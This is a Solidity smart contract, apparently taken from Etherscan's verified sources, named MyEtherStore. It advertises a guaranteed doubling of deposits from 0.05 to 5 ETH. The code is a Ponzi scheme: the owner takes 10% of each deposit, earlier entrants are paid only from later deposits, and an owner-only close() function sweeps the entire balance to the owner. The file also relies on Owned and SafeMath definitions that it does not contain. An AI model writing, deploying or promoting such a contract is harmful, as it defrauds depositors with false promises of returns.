/**
 *Submitted for verification at Etherscan.io on 2020-04-25
*/

pragma solidity ^0.5.0;

/*   
Developer Telegram    : @MyEtherStoreTeam


MyEtherStore......MyEtherStore.......MyEtherStore........MyEtherStore........MyEtherStore

                                        
                                        Profit Table

               *Entry With*              *Doubles*                *Retuns Out*
                 0.05 ETH                   2X                      0.10 ETH  
                 0.10 ETH                   2X                      0.20 ETH 
                 0.25 ETH                   2X                      0.50 ETH
                 0.50 ETH                   2X                      1.00 ETH 
                 1.00 ETH                   2X                      2.00 ETH 
                 1.50 ETH                   2X                      3.00 ETH 
                 2.00 ETH                   2X                      4.00 ETH 
                 2.50 ETH                   2X                      5.00 ETH 
                 3.00 ETH                   2X                      6.00 ETH 
                 3.50 ETH                   2X                      7.00 ETH 
                 4.00 ETH                   2X                      8.00 ETH
                 4.50 ETH                   2X                      9.00 ETH
                 5.00 ETH                   2X                      10.0 ETH
                 
                   
MyEtherStore......MyEtherStore.......MyEtherStore........MyEtherStore........MyEtherStore
*/


//owner change function



contract MyEtherStore is Owned{

	using SafeMath for uint;

	//address payable public owner;

	struct User {
		address payable addr;
		uint amount;
	}

	User[] public users;
	uint public currentlyPaying = 0;
	uint public totalUsers = 0;
	uint public totalWei = 0;
	uint public totalPayout = 0;
	bool public active;
	uint256 public minAmount=0.05 ether;
	uint256 public maxAmount=5.00 ether;

	constructor() public {
		owner = msg.sender;
		active = true;
	}
	
	function contractActivate() public{
	    require(msg.sender==owner);
	    require(active == false, "Contract is already active");
	    active=true;
	}
	function contractDeactivate() public{
	    require(msg.sender==owner);
	    require(active == true, "Contract must be active");
	    active=false;
	}
	
	function limitAmount(uint256 min , uint256 max) public{
	    require(msg.sender==owner, "Cannot call function unless owner");
	    minAmount=min;
	    maxAmount=max;
	}

	function close() public{
		require(msg.sender == owner, "Cannot call function unless owner");
		require(active == true, "Contract must be active");
		require(address(this).balance > 0, "This contract must have a balane above zero");
		owner.transfer(address(this).balance);
		active = false;
	}

	
	function() external payable{
	    require(active==true ,"Contract must be active");
	    require(msg.value>=minAmount,"Amount is less than minimum amount");
	    require(msg.value<=maxAmount,"Amount Exceeds the Maximum amount");
		users.push(User(msg.sender, msg.value));
		totalUsers += 1;
		totalWei += msg.value;

		owner.transfer(msg.value.div(10));
		while (address(this).balance > users[currentlyPaying].amount.mul(2)) {
			uint sendAmount = users[currentlyPaying].amount.mul(2);
			users[currentlyPaying].addr.transfer(sendAmount);
			totalPayout += sendAmount;
			currentlyPaying += 1;
		}
	}
	
	function join() external payable{
	    require(active==true ,"Contract must be active");
	    require(msg.value>=minAmount,"Amount is less than minimum amount");
	    require(msg.value<=maxAmount,"Amount Exceeds the Maximum amount");
		users.push(User(msg.sender, msg.value));
		totalUsers += 1;
		totalWei += msg.value;

		owner.transfer(msg.value.div(10));
		while (address(this).balance > users[currentlyPaying].amount.mul(2)) {
			uint sendAmount = users[currentlyPaying].amount.mul(2);
			users[currentlyPaying].addr.transfer(sendAmount);
			totalPayout += sendAmount;
			currentlyPaying += 1;
		}
	}
}